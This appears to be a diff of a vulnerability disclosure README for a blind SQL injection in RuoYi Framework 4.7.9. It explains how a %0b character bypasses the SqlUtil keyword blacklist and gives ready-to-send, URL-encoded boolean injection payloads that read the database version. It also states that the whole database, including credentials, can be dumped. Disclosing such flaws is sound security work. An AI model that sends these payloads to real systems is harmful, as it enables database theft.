@@ -1,6 +1,14 @@
 # Ruoyi-4.7.9-SQL-Injection-PoC
 ## Introduction
-This is a bypass of CVE-2022-4566, due to insufficient validation in `ruoyi-common/src/main/java/com/ruoyi/common/utils/sql/SqlUtil.java` . The regex can be bypass by using `%0b` instead of spaces, this results in SQL Injection.
+I discovered a Blind SQL Injection vulnerability in the `createTable` feature of RuoYi Framework v4.7.9. This allows an authenticated administrator to execute arbitrary SQL commands via the `sql` parameter. This is a bypass of CVE-2024-42900 fix as the SQL Injection filter in `filterKeyword` method is insufficient, the regex can be bypass by using `%0b` as the alternative character to spaces.
+
+## Affected Version
+Product: RuoYi Framework
+Version: ≤ 4.7.9
+Link: [[Ruoyi]](https://github.com/yangzongzhuan/RuoYi)
+
+## Vulnerability Analysis
+The vulnerability was found in the `https://github.com/yangzongzhuan/RuoYi/blob/master/ruoyi-common/src/main/java/com/ruoyi/common/utils/sql/SqlUtil.java` file as follow. The application relies on blacklist keywords to filter SQL Injection attacks, this approach is prone to bypasses. In this case, the blacklist doesn't block the `%0b` character, so I can use it to trigger SQL Injection with `select%0b`.
 
 ```java
 public class SqlUtil
@@ -29,11 +37,21 @@ public class SqlUtil
 ## Steps to reproduce Boolean SQL Injection
 1. Log in as admin
 2. Send createTable request   
-   a. Inject a TRUE query: `sql=CREATE%20table%20j2iz96_666%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c18%2c1))%3d45%2c%201%2c%201%2f0)%3b`
+   a. Inject a TRUE query:
    ![true-query](https://github.com/user-attachments/assets/56d95c1b-409e-4bdc-8247-beabb2dadeae)
-   b. Inject a FALSE query: `sql=CREATE%20table%20j2iz96_665%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c5%2c1))%3d44%2c%201%2c%201%2f0)%3b`
+   ```
+   sql=CREATE%20table%20j2iz96_666%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c18%2c1))%3d45%2c%201%2c%201%2f0)%3b
+   ```
+   b. Inject a FALSE query:
    ![false-query](https://github.com/user-attachments/assets/308fba92-18b8-44ce-befa-584e5265cdae)
+   ```
+   sql=CREATE%20table%20j2iz96_665%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c5%2c1))%3d44%2c%201%2c%201%2f0)%3b
+   ```
 **Caution**:  Need to change tablename in the CREATE query after every successful query.
+3. With the boolean-based SQL Injection, data can be exfiltrated using the Python poc in this repo
+// Add poc image
+## Impact
+An attacker with administrative privilege can dump the entire database, including other user credentials and system configurations.
 
 ## Advisory
 1. Filter the `%0b` character.
